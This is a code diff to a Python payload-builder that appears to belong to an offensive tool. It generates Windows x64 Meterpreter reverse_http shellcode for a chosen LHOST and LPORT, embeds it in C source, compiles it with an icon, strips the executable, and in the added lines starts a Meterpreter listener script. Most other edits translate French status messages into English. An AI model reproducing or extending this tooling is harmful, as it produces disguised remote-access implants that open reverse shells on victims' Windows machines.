@@ -9,6 +9,8 @@ def Construction():
     TYPE = "Meterpreter"
     PLATFORM = "Windows"
 
+    RC_PAYLOAD = "windows/x64/meterpreter/reverse_http"
+
     print("Payload x64 Meterpreter Reverse HTTP")
     core.x64_Windows_Features()
 
@@ -36,7 +38,7 @@ def Construction():
 
         PAYLOAD = gen.Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT)
 
-        print("Génération du fichier...")
+        print("[*] Code generation.")
 
         Final_Code = "#include <windows.h>\n"
         Final_Code += "#include <stdio.h>\n"
@@ -49,16 +51,21 @@ def Construction():
         with open('source.c', 'w') as f:
             f.write(Final_Code)
 
-        print("Fichier généré")
+        print("[+] Code generated.")
 
         ICON = gen.Add_Icon()
 
-        print("Compiling")
+        print("[*] Compiling.")
 
         gen.Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON)
 
-        print("Stripping")
+        print("[*] Stripping executable.")
 
         gen.Auto_Executable_Strip(FILENAME, PLATFORM)
+
+        gen.Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT)
+
+        print("[+] Complete task.")
+        print("[+] Exiting script.")
 
         Gen_Payload = False
